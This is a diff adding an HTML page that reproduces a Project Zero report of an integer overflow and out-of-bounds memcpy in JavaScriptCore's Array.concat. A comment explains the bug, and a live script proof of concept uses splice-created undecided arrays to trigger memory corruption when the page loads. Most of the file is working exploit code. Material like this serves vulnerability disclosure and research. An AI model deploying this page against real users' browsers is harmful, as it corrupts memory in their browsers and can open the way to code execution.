@@ -1,0 +1,67 @@
+<!--
+Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1095
+
+There is an out-of-bounds memcpy in Array.concat that can lead to memory corruption.
+
+In builtins/ArrayPrototype.js, the function concatSlowPath calls a native method @appendMemcpy with a parameter resultIndex that is handled unsafely by the method. It calls JSArray::appendMemcpy, which calculates the memory size for the combined arrays as follows:
+
+unsigned newLength = startIndex + otherLength;
+
+If startIndex (resultIndex from concatSlowPath in JS) is very large, an integer overflow can occur, causing too small a buffer to be allocated, and copying to occur outside of the buffer.
+
+It should be difficult to reach this state without a long execution time, because an array of length resultIndex needs to be allocated and copied before resultIndex is incremented, however if both arrays involved in the concatenation are of type ArrayWithUndecided JSArray::appendMemcpy returns true without copying, and resultIndex can be incremented with a low execution time.
+
+Arrays of type ArrayWithUndecided are usually of length 0, however, it is possible to create one by calling Array.splice on an array with all undefined elements. This will cause an undefined Array of the delete length to be allocated, and then returned without it being written to, which would cause it to decide its type.
+
+A minimal PoC is as follows, and a full PoC is attached.
+
+var a = [];
+a.length = 0xffffff00;
+
+var b = a.splice(0, 0x100000); // Undecided array
+
+var args = [];
+args.length = 4094;
+args.fill(b);
+
+var q = [];
+q.length = 0x1000;
+q.fill(7);
+
+var c = a.splice(0, 0xfffef); //Shorter undecided array
+
+args[4094] = c;
+args[4095] = q;
+
+
+b.concat.apply(b, args);
+-->
+
+<html>
+<body>
+<script>
+
+var a = [];
+a.length = 0xffffff00;
+
+var b = a.splice(0, 0x100000); // Undecided array
+
+var args = [];
+args.length = 4094;
+args.fill(b);
+
+var q = [];
+q.length = 0x1000;
+q.fill(7);
+
+var c = a.splice(0, 0xfffef); //Shorter undecided array
+
+args[4094] = c;
+args[4095] = q;
+
+
+b.concat.apply(b, args);
+
+</script>
+</body>
+</html>
